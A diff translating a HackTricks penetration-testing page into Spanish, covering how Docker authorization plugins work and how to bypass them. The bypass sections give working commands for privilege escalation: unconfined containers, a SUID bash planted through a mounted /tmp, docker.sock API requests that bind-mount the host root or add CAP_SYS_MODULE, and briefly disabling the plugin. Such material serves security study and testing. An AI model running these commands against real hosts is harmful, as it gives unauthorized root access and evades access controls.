@@ -1,90 +1,83 @@
-
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 
-**Docker’s** out-of-the-box **authorization** model is **all or nothing**. Any user with permission to access the Docker daemon can **run any** Docker client **command**. The same is true for callers using Docker’s Engine API to contact the daemon. If you require **greater access control**, you can create **authorization plugins** and add them to your Docker daemon configuration. Using an authorization plugin, a Docker administrator can **configure granular access** policies for managing access to the Docker daemon.
+El modelo de **autorización** predeterminado de **Docker** es de **todo o nada**. Cualquier usuario con permiso para acceder al demonio de Docker puede **ejecutar cualquier** comando de cliente de Docker. Lo mismo ocurre para los llamadores que utilizan la API de Engine de Docker para contactar con el demonio. Si necesita un **mayor control de acceso**, puede crear **plugins de autorización** y agregarlos a la configuración de su demonio de Docker. Usando un plugin de autorización, un administrador de Docker puede **configurar políticas de acceso granulares** para administrar el acceso al demonio de Docker.
 
-# Basic architecture
+# Arquitectura básica
 
-Docker Auth plugins are **external** **plugins** you can use to **allow/deny** **actions** requested to the Docker Daemon **depending** on the **user** that requested it and the **action** **requested**.
+Los plugins de autenticación de Docker son **plugins externos** que puede utilizar para **permitir/denegar** **acciones** solicitadas al demonio de Docker **dependiendo** del **usuario** que lo solicitó y la **acción** **solicitada**.
 
-When an **HTTP** **request** is made to the Docker **daemon** through the CLI or via the Engine API, the **authentication** **subsystem** **passes** the request to the installed **authentication** **plugin**(s). The request contains the user (caller) and command context. The **plugin** is responsible for deciding whether to **allow** or **deny** the request.
+Cuando se realiza una **solicitud HTTP** al demonio de Docker a través de la CLI o mediante la API de Engine, el **subsistema de autenticación** **pasa** la solicitud al o los **plugins de autenticación** instalados. La solicitud contiene el usuario (llamador) y el contexto del comando. El **plugin** es responsable de decidir si **permitir** o **denegar** la solicitud.
 
-The sequence diagrams below depict an allow and deny authorization flow:
+Los diagramas de secuencia a continuación representan un flujo de autorización de permitir y denegar:
 
-![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz\_allow.png)
+![Flujo de autorización permitir](https://docs.docker.com/engine/extend/images/authz\_allow.png)
 
-![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz\_deny.png)
+![Flujo de autorización denegar](https://docs.docker.com/engine/extend/images/authz\_deny.png)
 
-Each request sent to the plugin **includes the authenticated user, the HTTP headers, and the request/response body**. Only the **user name** and the **authentication method** used are passed to the plugin. Most importantly, **no** user **credentials** or tokens are passed. Finally, **not all request/response bodies are sent** to the authorization plugin. Only those request/response bodies where the `Content-Type` is either `text/*` or `application/json` are sent.
+Cada solicitud enviada al plugin **incluye el usuario autenticado, las cabeceras HTTP y el cuerpo de la solicitud/respuesta**. Solo se pasa el **nombre de usuario** y el **método de autenticación** utilizado al plugin. Lo más importante es que **no se pasan** las **credenciales** o tokens de usuario. Finalmente, **no se envían todos los cuerpos de solicitud/respuesta** al plugin de autorización. Solo se envían aquellos cuerpos de solicitud/respuesta donde el `Content-Type` es `text/*` o `application/json`.
 
-For commands that can potentially hijack the HTTP connection (`HTTP Upgrade`), such as `exec`, the authorization plugin is only called for the initial HTTP requests. Once the plugin approves the command, authorization is not applied to the rest of the flow. Specifically, the streaming data is not passed to the authorization plugins. For commands that return chunked HTTP response, such as `logs` and `events`, only the HTTP request is sent to the authorization plugins.
+Para los comandos que pueden secuestrar la conexión HTTP (`HTTP Upgrade`), como `exec`, el plugin de autorización solo se llama para las solicitudes HTTP iniciales. Una vez que el plugin aprueba el comando, la autorización no se aplica al resto del flujo. Específicamente, los datos de transmisión no se pasan a los plugins de autorización. Para los comandos que devuelven una respuesta HTTP fragmentada, como `logs` y `events`, solo se envía la solicitud HTTP a los plugins de autorización.
 
-During request/response processing, some authorization flows might need to do additional queries to the Docker daemon. To complete such flows, plugins can call the daemon API similar to a regular user. To enable these additional queries, the plugin must provide the means for an administrator to configure proper authentication and security policies.
+Durante el procesamiento de la solicitud/respuesta, algunos flujos de autorización pueden necesitar hacer consultas adicionales al demonio de Docker. Para completar dichos flujos, los plugins pueden llamar a la API del demonio de manera similar a un usuario regular. Para habilitar estas consultas adicionales, el plugin debe proporcionar los medios para que un administrador configure políticas de autenticación y seguridad adecuadas.
 
-## Several Plugins
+## Varios plugins
 
-You are responsible for **registering** your **plugin** as part of the Docker daemon **startup**. You can install **multiple plugins and chain them together**. This chain can be ordered. Each request to the daemon passes in order through the chain. Only when **all the plugins grant access** to the resource, is the access granted.
+Es responsabilidad suya **registrar** su **plugin** como parte del **inicio** del demonio de Docker. Puede instalar **múltiples plugins y encadenarlos**. Esta cadena puede ser ordenada. Cada solicitud al demonio pasa en orden a través de la cadena. Solo cuando **todos los plugins otorgan acceso** al recurso, se otorga el acceso.
 
-# Plugin Examples
+# Ejemplos de plugins
 
 ## Twistlock AuthZ Broker
 
-The plugin [**authz**](https://github.com/twistlock/authz) allows you to create a simple **JSON** file that the **plugin** will be **reading** to authorize the requests. Therefore, it gives you the opportunity to control very easily which API endpoints can reach each user.
+El plugin [**authz**](https://github.com/twistlock/authz) le permite crear un archivo **JSON** simple que el **plugin** leerá para autorizar las solicitudes. Por lo tanto, le brinda la oportunidad de controlar muy fácilmente qué puntos finales de API pueden alcanzar cada usuario.
 
-This is an example that will allow Alice and Bob can create new containers: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
+Este es un ejemplo que permitirá que Alice y Bob puedan crear nuevos contenedores: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`
 
-In the page [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) you can find the relation between the requested URL and the action. In the page [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) you can find the relation between the action name and the action
+En la página [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) puede encontrar la relación entre la URL solicitada y la acción. En la página [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) puede encontrar la relación entre el nombre de la acción y la acción.
 
-## Simple Plugin Tutorial
+## Tutorial de plugin simple
 
-You can find an **easy to understand plugin** with detailed information about installation and debugging here: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
+Puede encontrar un **plugin fácil de entender** con información detallada sobre la instalación y depuración aquí: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)
 
-Read the `README` and the `plugin.go` code to understand how is it working.
+Lea el archivo `README` y el código `plugin.go` para entender cómo funciona.
 
-# Docker Auth Plugin Bypass
+# Bypass de plugin de autenticación de Docker
 
-## Enumerate access
+## Enumerar acceso
 
-The main things to check are the **which endpoints are allowed** and **which values of HostConfig are allowed**.
+Las principales cosas a verificar son **qué puntos finales están permitidos** y **qué valores de HostConfig están permitidos**.
 
-To perform this enumeration you can **use the tool** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
+Para realizar esta enumeración, puede **usar la herramienta** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**
 
-## disallowed `run --privileged`
+## Ejecución no permitida de `run --privileged`
 
-### Minimum Privileges
-
+### Privilegios mínimos
 ```bash
 docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 ```
+### Ejecutando un contenedor y luego obteniendo una sesión privilegiada
 
-### Running a container and then getting a privileged session
-
-In this case the sysadmin **disallowed users to mount volumes and run containers with the `--privileged` flag** or give any extra capability to the container:
-
+En este caso, el administrador del sistema **prohibió a los usuarios montar volúmenes y ejecutar contenedores con la bandera `--privileged` o dar cualquier capacidad adicional al contenedor:**
 ```bash
 docker run -d --privileged modified-ubuntu
 docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
 See 'docker run --help'.
 ```
-
-However, a user can **create a shell inside the running container and give it the extra privileges**:
-
+Sin embargo, un usuario puede **crear una shell dentro del contenedor en ejecución y otorgarle privilegios adicionales**:
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
 #bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
@@ -96,13 +89,11 @@ docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be
 # With --cap-add=SYS_ADMIN
 docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
 ```
+Ahora, el usuario puede escapar del contenedor usando cualquiera de las [**técnicas previamente discutidas**](./#privileged-flag) y **escalar privilegios** dentro del host.
 
-Now, the user can escape from the container using any of the [**previously discussed techniques**](./#privileged-flag) and **escalate privileges** inside the host.
+## Montar carpeta con permisos de escritura
 
-## Mount Writable Folder
-
-In this case the sysadmin **disallowed users to run containers with the `--privileged` flag** or give any extra capability to the container, and he only allowed to mount the `/tmp` folder:
-
+En este caso, el administrador del sistema **prohibió a los usuarios ejecutar contenedores con la bandera `--privileged`** o dar cualquier capacidad adicional al contenedor, y solo permitió montar la carpeta `/tmp`:
 ```bash
 host> cp /bin/bash /tmp #Cerate a copy of bash
 host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
@@ -111,28 +102,26 @@ docker container> chmod u+s /host/bash
 host> /tmp/bash
  -p #This will give you a shell as root
 ```
-
 {% hint style="info" %}
-Note that maybe you cannot mount the folder `/tmp` but you can mount a **different writable folder**. You can find writable directories using: `find / -writable -type d 2>/dev/null`
+Ten en cuenta que quizás no puedas montar la carpeta `/tmp`, pero puedes montar una **carpeta diferente que sea escribible**. Puedes encontrar directorios escribibles usando: `find / -writable -type d 2>/dev/null`
 
-**Note that not all the directories in a linux machine will support the suid bit!** In order to check which directories support the suid bit run `mount | grep -v "nosuid"` For example usually `/dev/shm` , `/run` , `/proc` , `/sys/fs/cgroup` and `/var/lib/lxcfs` don't support the suid bit.
+**¡Ten en cuenta que no todos los directorios en una máquina Linux admitirán el bit suid!** Para comprobar qué directorios admiten el bit suid, ejecuta `mount | grep -v "nosuid"`. Por ejemplo, por lo general, `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` y `/var/lib/lxcfs` no admiten el bit suid.
 
-Note also that if you can **mount `/etc`** or any other folder **containing configuration files**, you may change them from the docker container as root in order to **abuse them in the host** and escalate privileges (maybe modifying `/etc/shadow`)
+También ten en cuenta que si puedes **montar `/etc`** o cualquier otra carpeta **que contenga archivos de configuración**, puedes cambiarlos desde el contenedor de Docker como root para **abusar de ellos en el host** y escalar privilegios (tal vez modificando `/etc/shadow`).
 {% endhint %}
 
-## Unchecked API Endpoint
+## Punto de conexión de API no verificado
 
-The responsibility of the sysadmin configuring this plugin would be to control which actions and with which privileges each user can perform. Therefore, if the admin takes a **blacklist** approach with the endpoints and the attributes he might **forget some of them** that could allow an attacker to **escalate privileges.**
+La responsabilidad del administrador del sistema que configura este plugin sería controlar qué acciones y con qué privilegios puede realizar cada usuario. Por lo tanto, si el administrador adopta un enfoque de **lista negra** con los puntos de conexión y los atributos, podría **olvidar algunos** que podrían permitir a un atacante **escalar privilegios**.
 
-You can check the docker API in [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
+Puedes comprobar la API de Docker en [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)
 
-## Unchecked JSON Structure
+## Estructura JSON no verificada
 
-### Binds in root
+### Vínculos en root
 
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Binds**".\
-In the following example it's possible to abuse this misconfiguration to create and run a container that mounts the root (/) folder of the host:
-
+Es posible que cuando el administrador del sistema configuró el firewall de Docker, **olvidó algún parámetro importante** de la [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Binds**".\
+En el siguiente ejemplo, es posible abusar de esta mala configuración para crear y ejecutar un contenedor que monta la carpeta raíz (/) del host:
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -142,39 +131,31 @@ docker start f6932bc153ad #Start the created privileged container
 docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 #You can access the host filesystem
 ```
-
 {% hint style="warning" %}
-Note how in this example we are using the **`Binds`** param as a root level key in the JSON but in the API it appears under the key **`HostConfig`**
+Observa cómo en este ejemplo estamos usando el parámetro **`Binds`** como una clave de nivel raíz en el JSON, pero en la API aparece bajo la clave **`HostConfig`**
 {% endhint %}
 
-### Binds in HostConfig
+### Binds en HostConfig
 
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Sigue las mismas instrucciones que con **Binds en root** realizando esta **solicitud** a la API de Docker:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
 ```
+### Montajes en la raíz
 
-### Mounts in root
-
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Siga las mismas instrucciones que con **Vínculos en la raíz** realizando esta **solicitud** a la API de Docker:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
 ```
+### Montajes en HostConfig
 
-### Mounts in HostConfig
-
-Follow the same instruction as with **Binds in root** performing this **request** to the Docker API:
-
+Siga las mismas instrucciones que con **Vínculos en root** realizando esta **solicitud** a la API de Docker:
 ```bash
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
 ```
+## Atributo JSON no verificado
 
-## Unchecked JSON Attribute
-
-It's possible that when the sysadmin configured the docker firewall he **forgot about some important attribute of a parameter** of the [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) like "**Capabilities**" inside "**HostConfig**". In the following example it's possible to abuse this misconfiguration to create and run a container with the **SYS\_MODULE** capability:
-
+Es posible que cuando el administrador del sistema configuró el firewall de Docker, **olvidó algún atributo importante de un parámetro de la [API](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)** como "**Capabilities**" dentro de "**HostConfig**". En el siguiente ejemplo es posible abusar de esta mala configuración para crear y ejecutar un contenedor con la capacidad **SYS\_MODULE**:
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -184,15 +165,13 @@ docker exec -it c52a77629a91 bash
 capsh --print
 #You can abuse the SYS_MODULE capability
 ```
-
 {% hint style="info" %}
-The **`HostConfig`** is the key that usually contains the **interesting** **privileges** to escape from the container. However, as we have discussed previously, note how using Binds outside of it also works and may allow you to bypass restrictions.
+El **`HostConfig`** es la clave que generalmente contiene los **privilegios** **interesantes** para escapar del contenedor. Sin embargo, como hemos discutido anteriormente, tenga en cuenta que el uso de Binds fuera de él también funciona y puede permitirle evitar restricciones.
 {% endhint %}
 
-## Disabling Plugin
+## Desactivando el Plugin
 
-If the **sysadmin** **forgotten** to **forbid** the ability to **disable** the **plugin**, you can take advantage of this to completely disable it!
-
+Si el **sysadmin** ha **olvidado** **prohibir** la capacidad de **desactivar** el **plugin**, ¡puedes aprovechar esto para desactivarlo por completo!
 ```bash
 docker plugin list #Enumerate plugins
 
@@ -204,14 +183,13 @@ docker plugin disable authobot
 docker run --rm -it --privileged -v /:/host ubuntu bash
 docker plugin enable authobot
 ```
+Recuerda **volver a habilitar el plugin después de escalar**, o un **reinicio del servicio de Docker no funcionará**.
 
-Remember to **re-enable the plugin after escalating**, or a **restart of docker service won’t work**!
-
-## Auth Plugin Bypass writeups
+## Writeups de Bypass del Plugin de Autorización
 
 * [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)
 
-# References
+# Referencias
 
 * [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)
 
@@ -220,16 +198,14 @@ Remember to **re-enable the plugin after escalating**, or a **restart of docker 
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
-
-
